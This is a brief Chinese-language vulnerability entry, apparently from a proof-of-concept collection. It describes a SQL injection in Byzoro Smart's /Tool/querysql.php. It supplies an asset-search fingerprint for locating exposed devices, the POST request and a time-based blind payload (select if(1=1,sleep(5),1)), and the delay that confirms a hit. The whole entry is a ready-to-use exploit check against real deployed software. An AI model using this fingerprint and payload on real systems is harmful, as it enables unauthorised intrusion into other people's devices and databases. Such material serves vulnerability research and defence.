# 百卓smartquerysql.php存在sql注入漏洞

百卓 ｜ SQL注入 ｜ —
- **指纹**：`app="byzoro-Smart"`
- **请求**：`POST /Tool/querysql.php? HTTP/1.1`

**Payload**
```
txt=select if(1=1,sleep(5),1)
```
- **响应特征**：200 响应时间>=5s